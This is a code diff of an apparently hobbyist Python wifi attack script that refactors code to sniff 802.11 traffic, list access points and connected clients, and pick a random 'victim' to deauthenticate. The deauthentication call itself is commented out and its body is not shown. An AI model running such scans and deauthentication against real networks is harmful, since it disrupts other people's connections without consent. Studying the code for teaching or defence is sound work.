@@ -4,7 +4,7 @@ import sys
 import sys
 import time
 import random
-import change_modes as modes
+# import change_modes as modes
 
 
 # Global Variables
@@ -19,12 +19,12 @@ users = list()
 def AP_handler(pkt):
     global ap_list
     # Checking if the packets have a 802.11 layer
-    if pkt.haslayer(Dot11):  # and pkt.type == 0 and pkt.subtype == 8:
-        dot11_layer = pkt.getlayer(Dot11)
-        if dot11_layer.addr2 and dot11_layer.addr2 not in ap_list and dot11_layer.payload.name != "NoPayload":
-            ap_list.append(dot11_layer.addr2)
-            ssid_list.append(dot11_layer.payload.name)
-            print(f"{len(ap_list)}\t{ dot11_layer.addr2}\t{dot11_layer.payload.name}")
+    if pkt.haslayer(Dot11):
+        network = pkt.getlayer(Dot11)
+        if network.addr2 and network.addr2 not in ap_list and network.payload.name != "NoPayload":
+            ap_list.append(network.addr2)
+            ssid_list.append(network.payload.name)
+            print(f"{len(ap_list)}\t{ network.addr2}\t{network.payload.name}")
 
 
 def users_handler(pkt):
@@ -36,7 +36,7 @@ def users_handler(pkt):
 
 def scan_wlan():
     print("\n\nScanning for access points...")
-    print("index\tMAC\t\t\tSSID")
+    print("Index\tMAC\t\t\tSSID")
     sniff(iface=iface, count=0, prn=AP_handler, timeout=10)
 
 
@@ -57,31 +57,42 @@ def deauthenticate_victim(iface, victim_mac_addr, ap_mac_addr):
 
 
 
-# Main
-scan_wlan()
+def network_attack():
+	scan_wlan()
 
-print("\nAccess Points Captured:\n\n", '\n'.join(ap_list))
-try:
-    random_ap = random.choice(ap_list)
-except:
-    print("List of Access Points is empty!")
-print(f"\nRandom chosen AP is: {random_ap}")
+	print("\nAccess Points Captured:\n\n", '\n'.join(ap_list))
+	try:
+		random_ap = random.choice(ap_list)
+	except:
+		print("List of Access Points is empty!")
+	print(f"\nRandom chosen AP is: {random_ap}")
 
-scan_for_users()
+	scan_for_users()
 
-try:
-    victim = random.choice(users)
-except:
-    print("List of Access Points is empty!")
-print(f"\nRandom chosen victm is: {victim}")
-print(f"\nVictim: {victim} has been hacked!!!")
-
-
-#victim = "c0:e8:62:82:aa:dd"
-#ap_mac_addr = "B4:EE:B4:A8:91:13"
-#deauthenticate_victim(iface, victim, ap_mac_addr)
+	try:
+		victim = random.choice(users)
+	except:
+		print("List of Access Points is empty!")
+	print(f"\nRandom chosen victm is: {victim}")
+	print(f"\nVictim: {victim} has been hacked!!!")
 
 
+	#victim = "c0:e8:62:82:aa:dd"
+	#ap_mac_addr = "B4:EE:B4:A8:91:13"
+	#deauthenticate_victim(iface, victim, ap_mac_addr)
+	
+	
+def defense_attack():
+	pass
 
+
+
+def main():
+	network_attack()
+	#defense_attack()
+
+
+if __name__ == "__main__":
+	main()
 
 
